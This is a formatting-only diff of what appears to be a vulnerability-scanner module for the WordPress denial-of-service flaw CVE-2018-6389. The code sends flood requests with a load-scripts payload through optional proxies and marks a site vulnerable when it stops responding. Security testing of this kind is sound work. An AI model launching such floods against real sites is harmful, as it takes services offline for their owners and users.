@@ -72,7 +72,8 @@ def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep,
               "svg-painter&ver=4.9.1"
     try:
         if socks_proxy is not None:
-            socks_version = socks.SOCKS5 if socks_proxy.startswith('socks5://') else socks.SOCKS4
+            socks_version = socks.SOCKS5 if socks_proxy.startswith(
+                'socks5://') else socks.SOCKS4
             socks_proxy = socks_proxy.rsplit('://')[1]
             if '@' in socks_proxy:
                 socks_username = socks_proxy.rsplit(':')[0]
@@ -83,10 +84,12 @@ def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep,
                 socket.socket = socks.socksocket
                 socket.getaddrinfo = getaddrinfo
             else:
-                socks.set_default_proxy(socks_version, str(socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
+                socks.set_default_proxy(socks_version, str(
+                    socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
                 socket.socket = socks.socksocket
                 socket.getaddrinfo = getaddrinfo
-        r = requests.get(target + payload, timeout=timeout_sec, headers=user_agent).content
+        r = requests.get(target + payload, timeout=timeout_sec,
+                         headers=user_agent).content
         return True
     except:
         return False
@@ -95,10 +98,11 @@ def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep,
 def test(target, retries, timeout_sec, user_agent, socks_proxy, verbose_level, trying, total_req, total,
          num, language, dos_flag, log_in_file, scan_id, scan_cmd, thread_tmp_filename):
     if verbose_level > 3:
-        info(messages(language,"trying_message").format(trying, total_req, num, total, target_to_host(target), '',
-                                           'wordpress_dos_cve_2018_6389_vuln'))
+        info(messages(language, "trying_message").format(trying, total_req, num, total, target_to_host(target), '',
+                                                         'wordpress_dos_cve_2018_6389_vuln'))
     if socks_proxy is not None:
-        socks_version = socks.SOCKS5 if socks_proxy.startswith('socks5://') else socks.SOCKS4
+        socks_version = socks.SOCKS5 if socks_proxy.startswith(
+            'socks5://') else socks.SOCKS4
         socks_proxy = socks_proxy.rsplit('://')[1]
         if '@' in socks_proxy:
             socks_username = socks_proxy.rsplit(':')[0]
@@ -109,23 +113,26 @@ def test(target, retries, timeout_sec, user_agent, socks_proxy, verbose_level, t
             socket.socket = socks.socksocket
             socket.getaddrinfo = getaddrinfo
         else:
-            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
+            socks.set_default_proxy(socks_version, str(
+                socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
             socket.socket = socks.socksocket
             socket.getaddrinfo = getaddrinfo
     n = 0
     while 1:
         try:
-            r = requests.get(target, timeout=timeout_sec, headers=user_agent).content
+            r = requests.get(target, timeout=timeout_sec,
+                             headers=user_agent).content
             return 0
         except:
             n += 1
             if n is retries:
                 if dos_flag:
                     __log_into_file(thread_tmp_filename, 'w', '0', language)
-                    info(messages(language,"vulnerable").format("wordpress_dos_cve_2018_6389_vuln"))
+                    info(messages(language, "vulnerable").format(
+                        "wordpress_dos_cve_2018_6389_vuln"))
                     data = json.dumps({'HOST': target_to_host(target), 'USERNAME': '', 'PASSWORD': '', 'PORT': '',
                                        'TYPE': 'wordpress_dos_cve_2018_6389_vuln',
-                                       'DESCRIPTION': messages(language,"vulnerable").format(
+                                       'DESCRIPTION': messages(language, "vulnerable").format(
                                            "wordpress_dos_cve_2018_6389_vuln"), 'TIME': now(), 'CATEGORY': "scan",
                                        'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
                     __log_into_file(log_in_file, 'a', data, language)
@@ -162,7 +169,8 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
         if methods_args is not None:
             for extra_requirement in extra_requirements_dict():
                 if extra_requirement in methods_args:
-                    new_extra_requirements[extra_requirement] = methods_args[extra_requirement]
+                    new_extra_requirements[
+                        extra_requirement] = methods_args[extra_requirement]
         extra_requirements = new_extra_requirements
         random_agent_flag = True
         if extra_requirements["wordpress_dos_cve_2018_6389_vuln_random_agent"][0] != "True":
@@ -180,16 +188,17 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
             url = 'http://{0}/'.format(target)
         else:
             if target.count(':') > 1:
-                __die_failure(messages(language,"insert_port_message"))
+                __die_failure(messages(language, "insert_port_message"))
             http = target.rsplit('://')[0]
             host = target_to_host(target)
-            path = "/".join(target.replace('http://', '').replace('https://', '').rsplit('/')[1:])
+            path = "/".join(target.replace('http://',
+                                           '').replace('https://', '').rsplit('/')[1:])
             url = http + '://' + host + '/' + path
         if test(url, retries, timeout_sec, user_agent, socks_proxy, verbose_level, trying, total_req, total, num,
                 language, False, log_in_file, scan_id, scan_cmd, thread_tmp_filename) is not 0:
-            warn(messages(language,"open_error").format(url))
+            warn(messages(language, "open_error").format(url))
             return
-        info(messages(language,"DOS_send").format(target))
+        info(messages(language, "DOS_send").format(target))
         n = 0
         t = threading.Thread(target=test,
                              args=(
@@ -209,8 +218,8 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
             t.start()
             trying += 1
             if verbose_level > 3:
-                info(messages(language,"trying_message").format(trying, total_req, num, total, target_to_host(target), port,
-                                                   'wordpress_dos_cve_2018_6389_vuln'))
+                info(messages(language, "trying_message").format(trying, total_req, num, total, target_to_host(target), port,
+                                                                 'wordpress_dos_cve_2018_6389_vuln'))
             try:
                 if int(open(thread_tmp_filename).read().rsplit()[0]) is 0:
                     if limit is not -1:
@@ -230,7 +239,8 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
                 break
         # wait for threads
         kill_switch = 0
-        kill_time = int(timeout_sec / 0.1) if int(timeout_sec / 0.1) is not 0 else 1
+        kill_time = int(
+            timeout_sec / 0.1) if int(timeout_sec / 0.1) is not 0 else 1
         while 1:
             time.sleep(0.1)
             kill_switch += 1
@@ -241,14 +251,16 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
                 break
         thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
         if thread_write is 1:
-            info(messages(language,"no_vulnerability_found").format("wordpress_dos_cve_2018_6389_vuln"))
+            info(messages(language, "no_vulnerability_found").format(
+                "wordpress_dos_cve_2018_6389_vuln"))
             if verbose_level is not 0:
                 data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': '',
                                    'TYPE': 'wordpress_dos_cve_2018_6389_vuln',
-                                   'DESCRIPTION': messages(language,"no_vulnerability_found").format("wordpress_dos_cve_2018_6389_vuln"),
+                                   'DESCRIPTION': messages(language, "no_vulnerability_found").format("wordpress_dos_cve_2018_6389_vuln"),
                                    'TIME': now(), 'CATEGORY': "scan",
                                    'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
                 __log_into_file(log_in_file, 'a', data, language)
         os.remove(thread_tmp_filename)
     else:
-        warn(messages(language,"input_target_error").format('wordpress_dos_cve_2018_6389_vuln', target))
+        warn(messages(language, "input_target_error").format(
+            'wordpress_dos_cve_2018_6389_vuln', target))
